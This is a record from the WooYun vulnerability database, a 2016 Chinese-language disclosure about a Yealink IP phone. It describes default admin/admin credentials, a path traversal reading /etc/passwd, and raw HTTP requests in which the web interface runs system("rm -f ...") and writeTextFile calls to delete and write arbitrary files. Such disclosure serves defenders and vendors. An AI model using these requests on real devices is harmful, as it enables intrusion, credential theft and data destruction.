{"id": 86941, "wybug_id": "wooyun-2016-0193013", "wybug_title": "Yealink某型号网络电话机配置不当(登入后可任意文件读取/删除/写入)", "wybug_corp": "厦门亿联网络技术股份有限公司", "wybug_author": "路人甲", "wybug_date": "2016-04-06 10:56", "wybug_open_date": "2016-05-21 11:00", "wybug_type": "默认配置不当", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["默认密码", "网络边界设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-06：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-05-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： yealink某型号网络电话机配置不当(任意文件读取/删除/写入)其实就是命令执行。。 详细说明：  由于是网络电话机，外网找不到案例。所以就。。\n\n登录默认admin/admin问客服也说是admin/admin\n\n\n\n进去之后，发现存在另一默认账号\nuser/user\n俩个默认账号。。#1 任意文件读取刚进去最明显的url一处\n**.**.**.**/cgi-bin/cgiServer.exx?page=../../../../../../etc/passwd%00\n\n\n第二处\n\n话机配置>升级>抓包>开始>结束>导出发现另一处\n**.**.**.**/cgi-bin/cgiServer.exx?download=/etc/passwd\n\n\n#2 任意文件删除\n\n联系人>本地联系人>选择文件>上传头像>删除>然后抓包\nPOST /cgi-bin/cgiServer.exx HTTP/1.1Host: **.**.**.**Content-Length: 219Authorization: Basic YWRtaW46YWRtaW4=Origin: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36Content-Type: application/octet-streamAccept: */*Referer: **.**.**.**/cgi-bin/cgiServer.exx?page=Contacts.htmAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Connection: closesystem(\"rm -f /data/userdata/contact-image/Penguins.jpg\")writeTextFile(\"../data/contact_list.xml\",\"<root_contact>\\n</root_contact>\\n\")msgBroadcastPostMessage(\"0x10007\",\"8\",\"0\")msgBroadcastPostMessage(\"0x10007\",\"50\",\"1\")\n-f 路径更改即可 测试是自己写入文件 自己删除。。#3 任意文件写入\n\n更改密码是通过写入config/data/htpasswd这个文件来实现。。\nPOST /cgi-bin/cgiServer.exx HTTP/1.1Host: **.**.**.**Content-Length: 50Authorization: Basic YWRtaW46YWRtaW4=Origin: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36Content-Type: application/octet-streamAccept: */*Referer: **.**.**.**/cgi-bin/cgiServer.exx?page=Security.htmAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Connection: closewriteTextFile(\"/data/userdata/1.txt\",\"**.**.**.**\")\n\n\n   漏洞证明：  同上   修复方案：  不懂   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}